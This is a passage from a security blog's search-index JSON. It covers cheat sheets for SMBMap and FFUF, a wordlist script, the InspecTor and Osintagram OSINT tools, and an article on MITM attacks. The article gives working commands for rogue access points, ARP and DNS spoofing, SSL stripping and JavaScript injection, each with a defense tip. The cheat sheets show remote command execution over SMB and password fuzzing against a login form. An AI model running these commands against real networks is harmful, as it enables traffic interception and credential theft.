it ideal for penetration testing and auditing SMB shares. Keep this cheat sheet handy to streamline your workflows.\n","permalink":"http://localhost:1313/cheat-sheets/smbmap/","summary":"\u003cp\u003e\u003cstrong\u003eSMBMap\u003c/strong\u003e is a command-line tool for enumerating and interacting with SMB shares. It allows you to execute commands, upload/download files, and assess permissions effectively.\u003c/p\u003e\n\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u \u0026lt;username\u0026gt; -p \u0026lt;password\u0026gt; -H \u0026lt;host\u0026gt; \u003cspan style=\"color:#f92672\"\u003e[\u003c/span\u003eoptions\u003cspan style=\"color:#f92672\"\u003e]\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"common-usage-examples\"\u003eCommon Usage Examples\u003c/h2\u003e\n\u003ch3 id=\"connect-with-null-password\"\u003eConnect with Null Password\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u guest -p \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e -d . -H 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"connect-as-admin-with-password\"\u003eConnect as Admin with Password\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"execute-a-command\"\u003eExecute a Command\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 -x \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;ipconfig\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"connect-to-a-specific-drive\"\u003eConnect to a Specific Drive\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 -r \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;C$\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"upload-a-file\"\u003eUpload a File\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 --upload \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;/path/to/file.txt\u0026#39;\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;C$\\file.txt\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"download-a-file\"\u003eDownload a File\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -u admin -p password123 -d . -H 192.168.1.1 --download \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;C$\\file.txt\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-a-specific-share\"\u003eEnumerate a Specific Share\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -H 192.168.1.1 -s \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;share_name\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 id=\"enumerate-users\"\u003eEnumerate Users\u003c/h3\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esmbmap -H 192.168.1.1 --users\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch2 id=\"key-options\"\u003eKey Options\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-u \u0026lt;username\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the username.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;password\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the password.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-H \u0026lt;host\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify the target host.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-r \u0026lt;share\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Connect to a specific share or drive.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-x \u0026lt;command\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Execute a command on the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--upload \u0026lt;local_file\u0026gt; \u0026lt;remote_path\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Upload a file to the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--download \u0026lt;remote_file\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Download a file from the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-s \u0026lt;share\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Enumerate a specific share.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e--users\u003c/code\u003e\u003c/strong\u003e: Enumerate users on the target.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-R\u003c/code\u003e\u003c/strong\u003e: Check for shares with full permissions.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003e\u003ccode\u003e-p \u0026lt;port\u0026gt;\u003c/code\u003e\u003c/strong\u003e: Specify a port.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"when-to-use-smbmap\"\u003eWhen to Use SMBMap\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003ePermission Audits\u003c/strong\u003e: Quickly identify shares with read, write, or full access permissions.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCommand Execution\u003c/strong\u003e: Execute remote commands on accessible shares.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eFile Transfers\u003c/strong\u003e: Upload or download files directly from SMB shares.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eUser Enumeration\u003c/strong\u003e: Discover user accounts configured on the target system.\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"final-thoughts\"\u003eFinal Thoughts\u003c/h2\u003e\n\u003cp\u003eSMBMap is an efficient and user-friendly tool for SMB enumeration and interaction. Its flexibility makes it ideal for penetration testing and auditing SMB shares. Keep this cheat sheet handy to streamline your workflows.\u003c/p\u003e","title":"SMBMap"},{"content":"Sometimes you just need a clean wordlist without the frills of a complicated tool. That’s where this Wordlist Generator comes in. It’s a simple Bash script designed to pull unique words from one or more text files, sort them, and save them neatly into a wordlist. Whether you’re prepping for a dictionary attack, building a natural language dataset, or just satisfying your curiosity, this script gets the job done quickly and efficiently.\nWhy Bash? You might be asking, why Bash? Well, there’s beauty in simplicity. This script was created to strip down the task to its essentials: no dependencies, no extra fuss, just the native power of Bash. While there are plenty of tools out there for generating wordlists, this one leans into the Unix philosophy—do one thing, and do it well.\nHow It Works The script takes one or more text files as input, extracts the words, normalizes them to lowercase, removes duplicates, sorts them, and outputs everything into a file called wordlist.txt. The end result? A clean, ordered list of unique words ready for your next project.\nKey Features Simple Input: Accepts multiple text files as input. Automatic Sorting: Ensures the wordlist is alphabetically ordered. No Dependencies: Works out of the box with any modern Bash shell. Efficiency: Processes files with a single command pipeline. Getting Started Installation Just grab the script at the bottom of this page, make it executable, and you’re good to go. Or you can get it on my github :\ngit clone https://github.com/noobosaurus-r3x/Wordlister cd Wordlister chmod +x wordlister.sh Usage The script is designed to be intuitive and easy to use. Here’s the basic syntax:\n./wordlister.sh file1.txt file2.txt file3.txt What It Does Combines the contents of all provided text files. Extracts words by splitting on non-alphanumeric characters. Converts all words to lowercase to avoid duplicates like Word and word. Removes duplicates entirely. Outputs the results into wordlist.txt in the current directory. Example Imagine you have two text files, file1.txt and file2.txt, and you want to generate a wordlist:\nRun the script:\n./wordlister.sh file1.txt file2.txt The script processes the files and outputs:\nCreated wordlist with 500 words Open wordlist.txt to see your results.\nNotes If no files are provided, the script will display a usage message and exit. The output file is overwritten each time the script runs, so be sure to back up your previous wordlists if needed. The Script For those who want a peek under the hood, here’s the full script:\n#!/usr/bin/env bash set -euo pipefail IFS=$\u0026#39;\\n\\t\u0026#39; if [ $# -eq 0 ]; then echo \u0026#34;Usage: $0 \u0026lt;text_file1\u0026gt; [\u0026lt;text_file2\u0026gt; ...]\u0026#34; exit 1 fi wordlist=\u0026#34;wordlist.txt\u0026#34; # Process input files to extract unique words in lowercase LC_ALL=C cat \u0026#34;$@\u0026#34; \\ | tr -c \u0026#39;[:alnum:]\u0026#39; \u0026#39;\\n\u0026#39; \\ | tr \u0026#39;[:upper:]\u0026#39; \u0026#39;[:lower:]\u0026#39; \\ | sort -u \u0026gt; \u0026#34;$wordlist\u0026#34; word_count=$(wc -l \u0026lt; \u0026#34;$wordlist\u0026#34;) echo \u0026#34;Created wordlist with $word_count words\u0026#34; Why Use This Script? If you need a no-nonsense way to generate a wordlist, this script has you covered. It’s lightweight, fast, and doesn’t require any external tools or libraries. Whether you’re working in cybersecurity, natural language processing, or simply organizing your text data, this Bash script is a reliable companion.\nFinal Thoughts Sometimes the simplest tools are the most effective. This wordlist generator isn’t trying to be fancy; it’s just trying to do the job—and it does it well. If you’ve got improvements or ideas, feel free to tweak the script to fit your needs. After all, the best tools are the ones you make your own.\n","permalink":"http://localhost:1313/tools/wordlister/","summary":"\u003cp\u003eSometimes you just need a clean wordlist without the frills of a complicated tool. That’s where this \u003cstrong\u003eWordlist Generator\u003c/strong\u003e comes in. It’s a simple Bash script designed to pull unique words from one or more text files, sort them, and save them neatly into a wordlist. Whether you’re prepping for a dictionary attack, building a natural language dataset, or just satisfying your curiosity, this script gets the job done quickly and efficiently.\u003c/p\u003e","title":"Wordlister"},{"content":"MITM Attacks: How to Crash the Party Between Alice and Bob Man-in-the-Middle attacks (MITM) are like showing up uninvited to someone else’s private conversation, grabbing a chair, and whispering, “Don’t mind me.” Except, instead of tea and gossip, the stakes are passwords, credit card numbers, and the little details your digital life holds. Carol—the uninvited hacker—isn’t just listening; she’s reading, stealing, and sometimes tweaking what’s being said.\nToday, we’ll crash this party and take a look at how Carol pulls off her tricks, why they work, and what you can do to stop her from making herself at home in your traffic.\nWhat Even Is a Man-in-the-Middle Attack? Picture this: Alice and Bob are exchanging secrets—love letters, memes, bank details, or maybe just complaining about Carol. They think they’re communicating directly, but little do they know, Carol is sitting in the middle, reading every word, tweaking the conversation, and cackling like a villain in a bad spy movie.\nIn the digital world, Alice could be your laptop, Bob a website or server, and Carol a hacker lurking on your café’s Wi-Fi or corporate network. She intercepts traffic, decrypts it (sometimes), and messes with it however she pleases.\nThe terrifying part? This can happen to you without you realizing it—until it’s too late.\nHow Carol Crashes the Party: Common MITM Tricks Carol’s bag of tricks is stuffed with clever (and sometimes shockingly simple) ways to hijack your traffic. Here’s how she pulls it off:\n1. Rogue Wi-Fi Access Points: Carol’s Favorite Honeytrap Setting up a rogue Wi-Fi access point doesn’t require much more than a laptop, a coffee shop corner, and a catchy SSID like Free_Cafe_WiFi or Starbux_Free. You think you’re connecting to free Wi-Fi for your overpriced latte, but you’re actually walking straight into Carol’s trap.\nHow It Works (The Tech Bit): Broadcast the Trap: Carol uses tools like Airbase-ng to create a fake access point. airbase-ng -e \u0026#34;Starbux_Guest\u0026#34; -c 6 wlan0mon Monitor the Victims: Your device connects, trusting the familiar name. Carol now acts as the gateway to the internet. Proxy the Traffic: With tools like ettercap or mitmproxy, Carol routes all your traffic through her machine. She can sniff, modify, or inject malware at will. bettercap -T -q -M arp:remote // // -i wlan0 Optional Evil Fun: Carol can inject JavaScript keyloggers, replace downloads with malware, or redirect DNS queries to phishing pages. Why It’s Effective Devices love auto-connecting to networks they recognize, and humans… well, we love free Wi-Fi.\nDefense Tip: Always use a VPN. It wraps your data in encryption, making Carol’s snooping session as useful as watching a scrambled TV channel from the 90s.\n2. ARP Spoofing: “Hi, I’m the Router Now” ARP (Address Resolution Protocol) is like the phonebook for local networks, mapping IP addresses to MAC addresses. But ARP has a fatal flaw: it trusts everyone. Carol exploits this blind trust to impersonate the router and redirect all traffic through herself.\nHow It Works: Carol tells the router: “Hey, I’m Alice.” Carol tells Alice: “Hey, I’m the router.” Traffic meant for Alice or the router now flows through Carol. arpspoof -i eth0 -t 192.168.1.10 -r 192.168.1.1 Why It’s Effective On a LAN, ARP spoofing is lightning-fast and stealthy. Carol can:\nSniff unencrypted traffic with Wireshark. Modify requests in real time. Drop packets because chaos is fun. The Tell: On compromised machines, running arp -a often exposes duplicate MAC addresses—a sign Carol’s in the mix.\nDefense Tip: Use ARP detection tools like Arpwatch or enable Dynamic ARP Inspection (DAI) on managed switches.\n3. DNS Spoofing: Carol’s Redirection Magic You type bank.com into your browser. Carol decides that’s cute and redirects you to fak3bank.com—a malicious clone where she harvests your login details.\nHow It Works: Carol intercepts DNS requests (via tools like tcpdump): tcpdump -i eth0 udp port 53 She injects a fake DNS response faster than the real DNS server: dnsspoof -i eth0 -f dns_hosts Example dns_hosts file: 133.7.133.7 google.com You land on Carol’s server, which looks real enough for you to log in like a good, oblivious citizen. Defense Tip: Use DNSSEC to validate DNS responses and encrypt queries with DNS-over-HTTPS (DoH).\n4. SSL Stripping: Downgrading You Back to 2005 You know HTTPS—the comforting padlock in your browser bar? Carol strips it away like a magician revealing a trapdoor.\nHow It Works: You type https://example.com. Carol intercepts and strips the HTTPS headers, forcing a plain old HTTP connection. Everything—passwords, credit card info, embarrassing searches—travels unencrypted. bettercap -iface eth0 -caplet https-ui Carol logs it all. The tiny missing s in HTTPS becomes the gateway to your digital life.\nDefense Tip: Use HSTS (HTTP Strict Transport Security) and browser extensions like HTTPS Everywhere to force secure connections.\n5. HTTPS Spoofing: Fake Certificates, Real Problems If SSL stripping is a blunt hammer, HTTPS spoofing is a precision scalpel. Carol doesn’t remove encryption—she fakes it.\nHow It Works: Carol generates a self-signed SSL certificate to impersonate a legitimate server: openssl req -new -x509 -keyout fakekey.pem -out fakecert.pem She intercepts the connection, swapping the real SSL cert for her fake one. Your browser thinks it’s secure (padlock and all), and Carol decrypts everything. Why It Works Most people trust the padlock icon without ever inspecting the certificate details.\nDefense Tip: Use certificate pinning to reject impostor certificates and manually verify SSL certificates for sensitive services.\nMITM Isn’t Just Eavesdropping—It’s Total Manipulation MITM doesn’t stop at listening. Carol can inject malware, redirect you to phishing sites, or swap out legitimate downloads with compromised files. She can even inject JavaScript into HTTP traffic to keylog everything you type. Tools like Bettercap make this child’s play:\nbettercap -iface eth0 -caplet js-inject Final Thoughts: How to Keep Carol Out MITM attacks exploit trust—trust in open networks, unverified certificates, or unsecured protocols. But with a few defenses, you can kick Carol out of the party:\nAlways use a VPN on public networks. Enable HSTS, DNSSEC, and encrypted DNS (DoH/DoT). Inspect SSL certificates, especially on critical services. Watch for anomalies: duplicate MAC addresses, suspicious DNS redirects, or missing HTTPS. In short: trust no one, especially not the Wi-Fi named Free_Cafe_WiFi. Carol’s out there, latte in hand, waiting for you to slip up. Don’t give her the satisfaction.\n","permalink":"http://localhost:1313/articles/mitm_crash_a_party/","summary":"\u003ch1 id=\"mitm-attacks-how-to-crash-the-party-between-alice-and-bob\"\u003e\u003cstrong\u003eMITM Attacks: How to Crash the Party Between Alice and Bob\u003c/strong\u003e\u003c/h1\u003e\n\u003cp\u003eMan-in-the-Middle attacks (MITM) are like showing up uninvited to someone else’s private conversation, grabbing a chair, and whispering, \u003cem\u003e“Don’t mind me.”\u003c/em\u003e Except, instead of tea and gossip, the stakes are passwords, credit card numbers, and the little details your digital life holds. Carol—the uninvited hacker—isn’t just listening; she’s reading, stealing, and sometimes \u003cem\u003etweaking\u003c/em\u003e what’s being said.\u003c/p\u003e\n\u003cp\u003eToday, we’ll crash this party and take a look at how Carol pulls off her tricks, why they work, and what you can do to stop her from making herself at home in your traffic.\u003c/p\u003e","title":"MITM Attacks"},{"content":"InspecTor: A Streamlined Tool for Website Metadata Extraction Pulling metadata from websites was once a straightforward task. You could hit a few URLs, scrape the required data, and move on. However, with the rise of dynamic content, Tor-hidden services (.onion domains), and increasing anonymity concerns, the process became far more complex. InspecTor is a command-line tool I developed to address these challenges. It simplifies metadata extraction from websites, including Tor services, while preserving user anonymity.\nTo clarify, I’m not a professional developer, just someone who needed a functional solution when existing tools fell short. Most scrapers I tried either broke on .onion domains or failed to process JavaScript-heavy pages. I created InspecTor to extract emails, links, images, and other relevant data without exposing my IP address. While it’s not perfect, it works and might save you some headaches too.\nWhat Makes InspecTor Stand Out? InspecTor focuses on three core capabilities:\nMetadata Extraction: It retrieves emails, phone numbers, links, images, and other exposed data from websites. Tor Support: Requests are routed through the Tor network, enabling anonymous access to .onion domains and privacy-sensitive sites. Dynamic Content Handling: By leveraging Selenium, InspecTor processes JavaScript-heavy pages that traditional scrapers typically ignore. Combined with multithreading for concurrent URL processing, InspecTor offers an efficient way to gather metadata while avoiding flags or blocks.\nKey Features Anonymous Scraping: Routes all requests through the Tor network for IP anonymity and seamless .onion domain access. Dynamic Content Support: Processes JavaScript-dependent pages using Selenium. Targeted Metadata Extraction: Retrieve specific fields like emails, phone numbers, images, and links. Concurrent Processing: Multithreading allows simultaneous scraping of multiple URLs for improved speed. Flexible Output Formats: Export results to JSON, SQLite, or human-readable formats. Configurable Options: Adjust threading, output fields, SSL verification, and more. Setting Up InspecTor 1. Clone the Repository git clone https://github.com/noobosaurus-r3x/InspecTor.git cd InspecTor 2. Install Dependencies pip install -r requirements.txt 3. Install Tor Ensure Tor is installed and running to route requests.\nsudo apt update sudo apt install tor sudo systemctl start tor 4. Set Up Selenium (Optional for Dynamic Content) Install Chrome and ChromeDriver. Ensure ChromeDriver matches your browser version.\nUsing InspecTor Extract Metadata from Specific URLs Provide single or multiple URLs:\npython3 InspecTor.py -u https://example.com https://example.onion Process a File of URLs Input a list of targets from a file:\npython3 InspecTor.py -f urls.txt Force Tor for All Traffic Route all requests through Tor, even for non-.onion domains:\npython3 InspecTor.py -u https://example.com --force-tor Save Results to JSON or SQLite Export metadata to a file or database:\npython3 InspecTor.py -u https://example.onion -o metadata.json python3 InspecTor.py -u https://example.onion --database metadata.db Extract Specific Fields Focus on targeted data:\npython3 InspecTor.py -u https://example.onion --fields emails links -o contact_info.json Handle JavaScript Content Enable Selenium for scraping JavaScript-dependent pages:\npython3 InspecTor.py -u https://example.onion --use-selenium Example Commands Extract everything: python3 InspecTor.py -u https://example.onion --extract-all -o all_metadata.json Grab emails and phone numbers: python3 InspecTor.py -u https://example.com --fields emails phone_numbers -o contact_info.json Ignore SSL certificate issues: python3 InspecTor.py -u https://example.onion --no-verify-ssl --human-readable Output Formats JSON: Structured file output for further processing. SQLite: Database storage for querying and analysis. Human-Readable: Clean, formatted text output for quick reviews. Notes on Tor and Dynamic Content Tor Requirements: Tor must be running on 127.0.0.1:9050. Selenium Setup: Ensure Chrome and ChromeDriver versions match for dynamic content scraping. SSL Verification: Enabled by default; use --no-verify-ssl to bypass invalid certificates. Threading: Control parallel processing with --max-workers for faster scraping. Why I Built InspecTor InspecTor was born out of necessity. Existing tools often fell short when handling .onion domains or JavaScript-heavy pages. As someone who needed a simple and effective way to extract metadata for OSINT investigations, website audits, and cybersecurity research, I created InspecTor.\nIt’s not perfect, but it works. If it helps you solve a problem, that’s great. If you find ways to improve it, even better.\n\u0026ndash;\n","permalink":"http://localhost:1313/tools/inspector/","summary":"\u003ch2 id=\"inspector-a-streamlined-tool-for-website-metadata-extraction\"\u003eInspecTor: A Streamlined Tool for Website Metadata Extraction\u003c/h2\u003e\n\u003cp\u003ePulling metadata from websites was once a straightforward task. You could hit a few URLs, scrape the required data, and move on. However, with the rise of dynamic content, Tor-hidden services (.onion domains), and increasing anonymity concerns, the process became far more complex. InspecTor is a command-line tool I developed to address these challenges. It simplifies metadata extraction from websites, including Tor services, while preserving user anonymity.\u003c/p\u003e","title":"InspecTor"},{"content":"Gathering OSINT (Open-Source Intelligence) from Instagram used to be straightforward—grab a GitHub tool, run it, and get results. Then Instagram’s API updates broke nearly everything, leaving most tools useless. That’s where Osintagram comes in: a simple script I put together to finally get Instagram OSINT working again.\nI’m no developer, just someone frustrated by older tools failing in CTFs and OSINT exercises. Osintagram isn’t perfect, but it’s built to handle the updated systems Instagram uses today. Let me show you how it works and why it might save you some headaches.\nWhy Osintagram? If you’ve ever tried to scrape data from Instagram, you’ve probably hit limitations like expired session cookies or blocked API calls. Osintagram addresses these issues by:\nUsing Session Cookies: It requires an Instagram session cookie (sockpuppet accounts recommended). This lets you sidestep some of the traditional hurdles of accessing data. Focusing on Practical OSINT: Instead of bloated features, Osintagram keeps it simple and effective—fetching user data like followers, bio, posts, and more. Actually Working: Unlike older tools that throw errors with Instagram’s new API, this one is tested against modern challenges. Features Profile Information Retrieval: Extract usernames, full names, follower and following counts, posts, biographies, and even external website links. Identify whether the account is private or verified. Secure Session Management: Stores session cookies securely using encryption. Straightforward Command-Line Interface: Easy-to-use commands for data extraction. Randomized User Agents: Mimics browser requests to avoid detection. Setting It Up Installation Clone the repository: git clone https://github.com/noobosaurus-r3x/osintagram.git cd osintagram Install dependencies: pip3 install -r requirements.txt Initial Configuration Osintagram relies on an Instagram session ID. During the setup, you’ll provide this ID (from a browser cookie), and the tool will encrypt and store it securely. Use a sockpuppet account to avoid risks.\nRun the setup command:\npython3 osintagram.py --setup This generates two files:\nconfig.ini: Stores encrypted credentials. secret.key: The encryption key for decrypting session IDs. Now you’re ready to dive into OSINT.\nUsing Osintagram To fetch information about a specific Instagram user, run:\npython3 osintagram.py -u \u0026lt;target_username\u0026gt; Replace \u0026lt;target_username\u0026gt; with the Instagram handle you’re interested in. The tool will return:\nProfile stats (followers, following, posts). Account details (bio, verification status, links). The Tech Behind the Tool Osintagram’s architecture is straightforward but effective:\nSession Management: Handles login sessions securely using encrypted cookies. Randomized User Agents: Rotates user agents to simulate real browser activity. Output Handling: Formats fetched data for clarity using rich for visually appealing results. Key Scripts osintagram.py: The main script that orchestrates everything. setup.py: Encrypts and stores session cookies during the initial setup. instagram_api_handler.py: Handles API interactions to fetch profile data. output_manager.py: Manages formatting and presenting results. encryption_utils.py: Encrypts and decrypts session credentials. user_agent_manager.py: Generates randomized user agents. Limitations and Ethical Considerations Limitations: Requires manual extraction of session cookies. Cannot bypass Instagram’s rate limits or restrictions. Ethical Use: Only use this tool on accounts you have permission to analyze. Misuse of OSINT tools can lead to legal consequences. Credits Osintagram is inspired by Toutatis by Palenath. Huge thanks to Palenath for blazing the trail in Instagram OSINT tooling.\nFinal Thoughts Osintagram isn’t trying to reinvent the wheel—it’s here to fill the gaps left by older tools that couldn’t keep up with Instagram’s changes. Whether you’re an OSINT enthusiast or a researcher, it’s a reliable companion for extracting and analyzing Instagram profile data.\nGive it a shot, adapt it to your needs, and let me know if you run into issues.\n","permalink":"http://localhost:1313/tools/osintagram/","summary":"\u003cp\u003eGathering OSINT (Open-Source Intelligence) from Instagram used to be straightforward—grab a GitHub tool, run it, and get results. Then Instagram’s API updates broke nearly everything, leaving most tools useless. That’s where \u003cstrong\u003eOsintagram\u003c/strong\u003e comes in: a simple script I put together to finally get Instagram OSINT working again.\u003c/p\u003e\n\u003cp\u003eI’m no developer, just someone frustrated by older tools failing in CTFs and OSINT exercises. Osintagram isn’t perfect, but it’s built to handle the updated systems Instagram uses today. Let me show you how it works and why it might save you some headaches.\u003c/p\u003e","title":"Osintagram"},{"content":"FFUF (Fuzz Faster U Fool) is a fast and flexible web fuzzer that helps penetration testers and security researchers discover directories, files, parameters, and more.\nBasic Syntax ffuf -c -w path/to/wordlist -u https://target_url/FUZZ Examples # Filter responses with a content size of 4242 bytes ffuf -w /path/to/vhost/wordlist -u https://target_url/ -H \u0026#34;Host: FUZZ\u0026#34; -fs 4242 # Filter responses with a 401 status code ffuf -w /path/to/values.txt -u https://target_url/script.php?valid_name=FUZZ -fc 401 # Filter 401 responses and fuzz passwords in a POST request ffuf -w /path/to/postdata.txt -X POST -d \u0026#34;username=admin\\\u0026amp;password=FUZZ\u0026#34; -u https://target_url/login.php -fc 401 Common Flags -c: Enable colorized output. -maxtime: Set the maximum runtime for the process in seconds. -p: Set a delay between requests (e.g., 0.1 seconds). -v: Verbose output. -t: Number of threads (default is 40). -mc: Match specific HTTP status codes (e.g., 200, 301, 403, or all). -fc: Filter out responses by HTTP status codes. -w: Specify the wordlist path. -u: Define the target URL. -s: Enable silent mode. -recursion: Enable recursive fuzzing. -r: Follow redirects. -o: Output results to a file. -of: Specify output format (e.g., json, html, csv, all). -b: Include cookies in the request. Examples # Match all responses, filter 42-byte answers, output colored and verbose ffuf -w wordlist.txt -u https://example.org/FUZZ -mc all -fs 42 -c -v # Fuzz host headers and show only status 200 responses ffuf -w hosts.txt -u https://example.org/ -H \u0026#34;Host: FUZZ\u0026#34; -mc 200 # Fuzz the `name` field in a POST request with JSON data, filter responses containing \u0026#34;error\u0026#34; ffuf -w entries.txt -u https://example.org/ -X POST -H \u0026#34;Content-Type: application/json\u0026#34; \\ -d \u0026#39;{\u0026#34;name\u0026#34;: \u0026#34;FUZZ\u0026#34;, \u0026#34;anotherkey\u0026#34;: \u0026#34;anothervalue\u0026#34;}\u0026#39; -fr \u0026#34;error\u0026#34; # Use two wordlists for parameter and value fuzzing, match responses containing \u0026#34;VAL\u0026#34; ffuf -w params.txt:PARAM -w values.txt:VAL -u https://example.org/?PARAM=VAL -mr \u0026#34;VAL\u0026#34; -c Tips and Tricks Interactive Mode: Press Enter while FFUF is running to access interactive features, such as reconfiguring filters or saving the state. Multiple Payloads: Use the FUZZ keyword multiple times in a URL (e.g., https://example.org/path/FUZZ/another_path/FUZZ). Variables in URLs: Specify payload locations using variables (e.g., https://example.org/path/{var1}/another_path/{var2}). Final Thoughts FFUF is a versatile and efficient tool for web fuzzing. By mastering its options and syntax, you can quickly uncover hidden files, parameters, and vulnerabilities in your targets. Keep this cheat sheet handy to optimize your fuzzing workflows!\n","permalink":"http://localhost:1313/cheat-sheets/ffuf/","summary":"\u003cp\u003e\u003cstrong\u003eFFUF\u003c/strong\u003e (Fuzz Faster U Fool) is a fast and flexible web fuzzer that helps penetration testers and security researchers discover directories, files, parameters, and more.\u003c/p\u003e\n\u003ch2 id=\"basic-syntax\"\u003eBasic Syntax\u003c/h2\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003effuf -c -w path/to/wordlist -u https://target_url/FUZZ\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch3 